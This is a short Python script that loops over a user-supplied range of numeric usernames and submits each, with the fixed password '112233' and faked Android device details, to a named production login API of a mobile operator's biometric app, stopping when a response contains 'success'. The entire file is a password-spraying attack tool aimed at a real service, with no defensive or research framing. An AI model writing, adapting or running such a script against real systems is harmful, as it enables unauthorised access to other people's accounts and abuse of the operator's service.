import requests

# Get start and end numbers from user
start = int(input("What is the start No: "))
end = int(input("What is the end No: "))

url = "https://biometricapp.banglalink.net/DBSSBI/api/Security/LoginV4"

payload_template = {
    'password': "112233",
    'DeviceId': "022e92a7cf656454",
    'Lan': "bn",
    'VersionCode': "410",
    'VersionName': "18.1.2",
    'Type': "1",
    'OsVersion': "13",
    'KernelVersion': "33",
    'FirmwareVersion': "unknown",
    'DeviceModel': "23027RAD4I",
    'lac': "0",
    'cid': "0",
    'latitude': "25.1253714",
    'longitude': "91.3831146",
    'BPMSISDN': ""
}

headers = {
    'User-Agent': "okhttp/3.12.1",
    'Connection': "Keep-Alive",
    'Accept-Encoding': "gzip"
}

# Loop through the username range
for username in range(start, end + 1):
    payload = payload_template.copy()
    payload['UserName'] = str(username)
    response = requests.post(url, data=payload, headers=headers)
    print(f"Trying UserName: {username}")
    print(response.text)

    # Optional: stop if a successful response is detected
    if "success" in response.text.lower():  # Modify this condition as needed
        print("Successful login!")
        break
